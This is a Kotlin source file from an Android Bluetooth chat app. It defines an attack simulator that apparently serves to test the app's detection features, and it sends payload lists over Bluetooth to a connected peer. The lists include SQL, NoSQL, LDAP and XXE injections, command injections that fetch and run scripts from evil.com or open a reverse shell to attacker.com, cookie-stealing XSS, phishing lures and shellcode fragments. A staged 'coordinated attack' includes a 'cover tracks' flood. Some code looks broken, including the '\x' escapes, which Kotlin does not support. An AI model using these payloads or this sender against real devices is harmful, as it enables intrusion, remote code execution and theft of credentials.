// EnhancedAttackSimulation.kt - Improved attack patterns and detection
package com.plcoding.bluetoothchat.presentation.simulation

import com.plcoding.bluetoothchat.domain.chat.BluetoothController
import com.plcoding.bluetoothchat.presentation.BluetoothViewModel
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import java.util.UUID
import kotlin.random.Random

class EnhancedAttackSimulation(
    private val viewModel: BluetoothViewModel,
    private val bluetoothController: BluetoothController
) {

    // Enhanced Flooding Attack Patterns
    private val floodingPatterns = object {
        // Basic flood patterns
        fun generateBasicFlood(count: Int = 50): List<String> {
            return List(count) { i ->
                "FLOOD_${System.currentTimeMillis()}_${i}_${UUID.randomUUID().toString().take(8)}"
            }
        }

        // Rapid sequential messages
        fun generateRapidSequence(): List<String> {
            val timestamp = System.currentTimeMillis()
            return List(30) { i ->
                "MSG_SEQ_${timestamp}_${i.toString().padStart(3, '0')}"
            }
        }

        // Large payload flood
        fun generateLargePayloadFlood(): List<String> {
            return List(10) {
                "X".repeat(Random.nextInt(500, 1000)) + "_END_${System.currentTimeMillis()}"
            }
        }

        // Pattern-based flood
        fun generatePatternFlood(): List<String> {
            val patterns = listOf("AAAA", "1234", "SPAM", "TEST", "PING")
            return List(40) { i ->
                val pattern = patterns.random()
                "$pattern".repeat(Random.nextInt(5, 20)) + "_$i"
            }
        }

        // Mixed character flood
        fun generateMixedFlood(): List<String> {
            return List(25) {
                val chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()"
                (1..Random.nextInt(50, 200)).map { chars.random() }.joinToString("")
            }
        }
    }

    // Enhanced Injection Attack Patterns
    private val injectionPatterns = object {
        // SQL Injection variants
        val sqlInjections = listOf(
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM passwords --",
            "1' AND '1'='1",
            "admin'--",
            "' OR 1=1--",
            "1'; DELETE FROM logs WHERE '1'='1",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
            "UNION ALL SELECT NULL,NULL,NULL--"
        )

        // Command Injection variants
        val commandInjections = listOf(
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "; rm -rf /tmp/*",
            "$(curl http://evil.com/malware.sh | sh)",
            "`reboot`",
            "; shutdown -h now",
            "| nc -e /bin/sh attacker.com 4444",
            "&& echo 'hacked' > /tmp/pwned.txt",
            "; wget http://malicious.site/backdoor"
        )

        // Script Injection variants
        val scriptInjections = listOf(
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<script>document.location='http://evil.com?cookie='+document.cookie</script>",
            "<body onload=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<img src=\"x\" onerror=\"eval(atob('YWxlcnQoJ1hTUycp'))\">"
        )

        // JSON/NoSQL Injection
        val jsonInjections = listOf(
            """{"$ne": null}""",
            """{"$gt": ""}""",
            """{"$where": "this.password == this.confirm_password"}""",
            """{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}""",
            """{"$or": [{"username": "admin"}, {"password": {"$exists": false}}]}""",
            """{"cmd": "db.dropDatabase()"}""",
            """{"find": "users", "$where": "sleep(5000)"}""",
            """{"aggregate": "users", "pipeline": [{"$match": {}}], "cursor": {}}"""
        )

        // LDAP Injection
        val ldapInjections = listOf(
            "*)(uid=*",
            "admin)(&(password=*))",
            "*)(|(uid=*",
            ")(cn=*))(|(cn=*",
            "*)(mail=*))(&(mail=*",
            "admin))((|userPassword=*",
            "*)(objectClass=*",
            "*))(|(objectClass=*"
        )

        // XML Injection
        val xmlInjections = listOf(
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
            """<user><name>admin</name><password>' or '1'='1</password></user>""",
            """<!--<script>alert('XSS')</script>-->""",
            """<![CDATA[<script>alert('XSS')</script>]]>"""
        )
    }

    // Enhanced Spoofing Patterns
    private val enhancedSpoofingPatterns = listOf(
        // Financial scams
        "URGENT: Your bank account has been compromised. Verify immediately at http://secure-bank-verify.tk",
        "Payment of $${Random.nextInt(1000, 9999)} failed. Update payment method: http://bit.ly/update-payment",
        "Congratulations! You've won $${Random.nextInt(10000, 99999)}. Claim at http://prize-winner.ml",

        // Account security
        "Security Alert: Unusual activity detected. Secure your account: http://account-security.ga",
        "Your password expires in 24 hours. Reset now: http://password-reset.cf",
        "2FA verification required. Enter code at: http://2fa-verify.tk",

        // System/Admin impersonation
        "System Administrator: Critical update required. Install from http://system-update.ml",
        "IT Support: Your device has ${Random.nextInt(10, 99)} viruses. Clean at http://virus-clean.tk",
        "Network Admin: Verify your credentials at http://network-auth.ga",

        // Social engineering
        "Friend request from ${listOf("Sarah", "John", "Emma", "Michael").random()}. View profile: http://social-profile.cf",
        "You have ${Random.nextInt(5, 20)} new messages. Read at http://messages.tk",
        "Someone viewed your profile ${Random.nextInt(10, 50)} times. See who: http://profile-views.ml"
    )

    // Enhanced Exploit Patterns
    private val enhancedExploitPatterns = object {
        // Buffer overflow attempts
        val bufferOverflows = listOf(
            "A".repeat(1024) + "\x90\x90\x90\x90",
            "B".repeat(512) + "\x41\x41\x41\x41\x41\x41\x41\x41",
            "\x90".repeat(200) + "\xeb\x1f\x5e\x89\x76\x08",
            "C".repeat(256) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68",
            "%x".repeat(100) + "%n",
            "%s".repeat(50) + "%n%n%n",
            "\x00".repeat(100) + "\xff\xff\xff\xff"
        )

        // Format string attacks
        val formatStrings = listOf(
            "%x %x %x %x %x %x %x %x %n",
            "%s%s%s%s%s%s%s%s%s%s",
            "%d %d %d %d %n",
            "%.10000x%.10000x%.10000x",
            "%p %p %p %p %p %p",
            "%%%d$x",
            "%*.*s",
            "%250\$n"
        )

        // Bluetooth-specific exploits
        val bluetoothExploits = listOf(
            "AT+BTPWR=0",
            "AT+BTSCAN",
            "AT+BTKEY=\"0000\"",
            "AT+BTDISCONN",
            "AT+BTFACTORY",
            "AT+BTMODE=0",
            "AT+BTHOST",
            "AT+BTPAIR=\"00:00:00:00:00:00\",\"0000\""
        )
    }

    // Attack execution methods
    suspend fun executeFloodingAttack(intensity: FloodIntensity = FloodIntensity.MEDIUM) {
        val messages = when (intensity) {
            FloodIntensity.LOW -> {
                floodingPatterns.generateBasicFlood(20) +
                        floodingPatterns.generateRapidSequence().take(10)
            }
            FloodIntensity.MEDIUM -> {
                floodingPatterns.generateBasicFlood(50) +
                        floodingPatterns.generatePatternFlood() +
                        floodingPatterns.generateRapidSequence()
            }
            FloodIntensity.HIGH -> {
                floodingPatterns.generateBasicFlood(100) +
                        floodingPatterns.generateLargePayloadFlood() +
                        floodingPatterns.generatePatternFlood() +
                        floodingPatterns.generateMixedFlood() +
                        floodingPatterns.generateRapidSequence()
            }
        }

        // Send messages with varying delays to simulate realistic flood
        messages.forEach { message ->
            bluetoothController.trySendMessage(message)
            delay(when (intensity) {
                FloodIntensity.LOW -> Random.nextLong(100, 300)
                FloodIntensity.MEDIUM -> Random.nextLong(50, 150)
                FloodIntensity.HIGH -> Random.nextLong(10, 50)
            })
        }
    }

    suspend fun executeInjectionAttack(type: InjectionType = InjectionType.MIXED) {
        val messages = when (type) {
            InjectionType.SQL -> injectionPatterns.sqlInjections.shuffled().take(5)
            InjectionType.COMMAND -> injectionPatterns.commandInjections.shuffled().take(5)
            InjectionType.SCRIPT -> injectionPatterns.scriptInjections.shuffled().take(5)
            InjectionType.JSON -> injectionPatterns.jsonInjections.shuffled().take(5)
            InjectionType.LDAP -> injectionPatterns.ldapInjections.shuffled().take(5)
            InjectionType.XML -> injectionPatterns.xmlInjections.shuffled().take(5)
            InjectionType.MIXED -> {
                listOf(
                    injectionPatterns.sqlInjections.random(),
                    injectionPatterns.commandInjections.random(),
                    injectionPatterns.scriptInjections.random(),
                    injectionPatterns.jsonInjections.random(),
                    injectionPatterns.ldapInjections.random(),
                    injectionPatterns.xmlInjections.random()
                )
            }
        }

        messages.forEach { message ->
            bluetoothController.trySendMessage(message)
            delay(Random.nextLong(500, 1500))
        }
    }

    suspend fun executeSpoofingAttack() {
        val messages = enhancedSpoofingPatterns.shuffled().take(Random.nextInt(3, 7))

        messages.forEach { message ->
            bluetoothController.trySendMessage(message)
            delay(Random.nextLong(1000, 3000))
        }
    }

    suspend fun executeExploitAttack() {
        val messages = enhancedExploitPatterns.bufferOverflows.shuffled().take(2) +
                enhancedExploitPatterns.formatStrings.shuffled().take(2) +
                enhancedExploitPatterns.bluetoothExploits.shuffled().take(2)

        messages.forEach { message ->
            bluetoothController.trySendMessage(message)
            delay(Random.nextLong(800, 2000))
        }
    }

    suspend fun executeCoordinatedAttack() {
        // Simulate a realistic multi-stage attack

        // Stage 1: Reconnaissance (light flooding)
        floodingPatterns.generateBasicFlood(10).forEach { message ->
            bluetoothController.trySendMessage(message)
            delay(200)
        }

        delay(2000)

        // Stage 2: Vulnerability probing (various injections)
        listOf(
            injectionPatterns.sqlInjections.random(),
            injectionPatterns.commandInjections.random(),
            enhancedExploitPatterns.bluetoothExploits.random()
        ).forEach { message ->
            bluetoothController.trySendMessage(message)
            delay(1000)
        }

        delay(3000)

        // Stage 3: Social engineering attempt
        bluetoothController.trySendMessage(enhancedSpoofingPatterns.random())

        delay(2000)

        // Stage 4: Exploitation attempt
        enhancedExploitPatterns.bufferOverflows.take(3).forEach { message ->
            bluetoothController.trySendMessage(message)
            delay(500)
        }

        delay(1000)

        // Stage 5: Cover tracks with more flooding
        floodingPatterns.generateMixedFlood().take(20).forEach { message ->
            bluetoothController.trySendMessage(message)
            delay(100)
        }
    }

    // Test specific attack patterns
    fun generateTestAttackFlow(): Flow<String> = flow {
        // Test flooding detection
        repeat(5) {
            emit("FLOOD_TEST_${System.currentTimeMillis()}_$it")
            delay(50)
        }

        delay(1000)

        // Test injection detection
        emit("SELECT * FROM users WHERE id='1' OR '1'='1'")
        delay(500)
        emit("<script>alert('test')</script>")
        delay(500)
        emit("; cat /etc/passwd")

        delay(1000)

        // Test spoofing detection
        emit("URGENT: Click http://malicious.site to verify your account")
        delay(500)
        emit("Admin: Your password will expire. Update at http://fake.site")

        delay(1000)

        // Test exploit detection
        emit("A".repeat(512) + "\x41\x41\x41\x41")
        delay(500)
        emit("AT+BTFACTORY")
    }

    enum class FloodIntensity {
        LOW, MEDIUM, HIGH
    }

    enum class InjectionType {
        SQL, COMMAND, SCRIPT, JSON, LDAP, XML, MIXED
    }
}

// Extension function for ViewModel
fun BluetoothViewModel.executeEnhancedAttack(attackType: AttackType) {
    viewModelScope.launch {
        val simulator = EnhancedAttackSimulation(this@executeEnhancedAttack, bluetoothController)

        when (attackType) {
            AttackType.FLOODING -> simulator.executeFloodingAttack(
                EnhancedAttackSimulation.FloodIntensity.MEDIUM
            )
            AttackType.INJECTION -> simulator.executeInjectionAttack(
                EnhancedAttackSimulation.InjectionType.MIXED
            )
            AttackType.SPOOFING -> simulator.executeSpoofingAttack()
            AttackType.EXPLOIT -> simulator.executeExploitAttack()
            AttackType.COORDINATED -> simulator.executeCoordinatedAttack()
        }
    }
}

// Additional attack type
enum class AttackType {
    FLOODING,
    INJECTION,
    SPOOFING,
    EXPLOIT,
    COORDINATED
}